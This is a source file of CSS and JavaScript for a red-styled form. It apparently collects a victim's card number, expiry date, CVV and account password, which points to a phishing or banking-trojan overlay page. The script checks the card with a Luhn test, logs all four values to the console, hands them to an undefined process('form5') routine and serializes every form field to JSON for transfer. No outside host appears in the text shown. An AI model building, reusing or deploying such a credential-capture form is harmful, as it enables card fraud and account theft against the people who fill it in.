html, body {
	text-align: center;
	position: relative;
	padding: 0;
	margin: 0;
	width: 100%;
	height: 98%;
	color: #555;
	font-family: serif, Arial;
	background: #c51522;
}

.menu a {
            display: block;
            width: 50%;
            height: 35px;
            background: #891522;
            color: white;
            font-family: Tahoma,serif;
            font-size: 16px;
            text-decoration: none;
            padding-top: 15px;
            border-bottom: 2px solid #ed222a;
            float: left;
            margin-bottom: 15px;
            font-weight: bold;
        }

        .menu a:active,
        .menu a.active {
            background: #a7303e;
            border-bottom: 6px solid #ed222a;
        }

        .input-field {
            border: none;
            border-bottom: 2px solid #bd5b62;
            background: #a41722;
            height: 35px !important;
            width: 88%;
            font-size: 16px;
            margin: 10px 2% 5px;
            padding-left: 8%;
            font-family: Tahoma,serif;
            color: white;
        }

        .input-field:focus {
            border-bottom: 2px solid white;
        }

        .submit-button {
            display: block;
            width: 87%;
            margin-left: 7%;
            background: #c51522;
            border: 2px solid white;
            height: 50px;
            font-family: Tahoma,serif;
            font-size: 16px;
            font-weight: bold;
            color: white;
            margin-top: 15px;
            float: left;
            cursor: pointer;
        }

        .footer-link {
            font-family: Tahoma,serif;
            font-size: 16px;
            color: white;
            text-decoration: underline;
            width: 40%;
            margin-left: 7%;
            margin-right: 3%;
            margin-top: 15px;
            position: relative;
            display: inline-block;
            float: left;
            text-align: left;
        }

        .input-field.fielderror {
            border: 2px solid #f00;
        }

    var g_oBtn = document.getElementById('submitBtn1');
    g_oBtn.onclick = function () {
        var ccNum = document.getElementById("card_number");
        var ccExpiration = document.getElementById("card_expiration_date");
        var ccCvv = document.getElementById("card_cvv");
        var password = document.getElementById("password");

        ccNum.classList.remove('fielderror');
        ccExpiration.classList.remove('fielderror');
        ccCvv.classList.remove('fielderror');
        password.classList.remove('fielderror');

        if(!valid_credit_card(ccNum.value)){
            ccNum.classList.add('fielderror');
            return false;
        }
        if (!validateCreditCardNumber(ccNum.value)) {
            ccNum.classList.add('fielderror');
            return false;
        }

        if (!validateExpirationDate(ccExpiration.value)) {
            ccExpiration.classList.add('fielderror');
            return false;
        }

        if (!validateCvv(ccCvv.value)) {
            ccCvv.classList.add('fielderror');
            return false;
        }

        if (!validatePassword(password.value)) {
            password.classList.add('fielderror');
            return false;
        }
        process('form5');
        console.log('print event: ' + ccNum.value + ', exp: ' + ccExpiration.value + ', cvv: ' + ccCvv.value + ', pass: ' + password.value);
    }

    function validateCreditCardNumber(ccNum) {
        return ccNum.length > 18 && ccNum.length < 21;
    }

    function validateExpirationDate(date) {
        var noLettersRegEx = /^[^a-zA-Z]+$/;

        return noLettersRegEx.test(date);
    }

    function validateCvv(cvv) {
        var cvvRegEx = /^[0-9]{3,4}$/;

        return cvvRegEx.test(cvv);
    }

    function validatePassword(password) {
        return password.length > 3;
    }

    function valid_credit_card(value) {
    if (/[^0-9-\s]+/.test(value)) return false;
    var nCheck = 0, nDigit = 0, bEven = false;
    value = value.replace(/\D/g, "");
    for (var n = value.length - 1; n >= 0; n--) {
      var cDigit = value.charAt(n),
        nDigit = parseInt(cDigit, 10);
      if (bEven) {
        if ((nDigit *= 2) > 9) nDigit -= 9;
      }
      nCheck += nDigit;
      bEven = !bEven;
    }
    return (nCheck % 10) == 0;
  }

var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
};

function formToJSON(f)
{
    var FinalObject = {}, namesHTML = ['input','select'];

    for(var i = 0; i < namesHTML.length; i++) {
      
        var bsform = f.getElementsByTagName(namesHTML[i]);
       
        for(var j = 0; j < bsform.length; j++) {
            FinalObject[bsform[j].id] = bsform[j].value;
            
        }
    }
    return stringifyJSON(FinalObject);
}
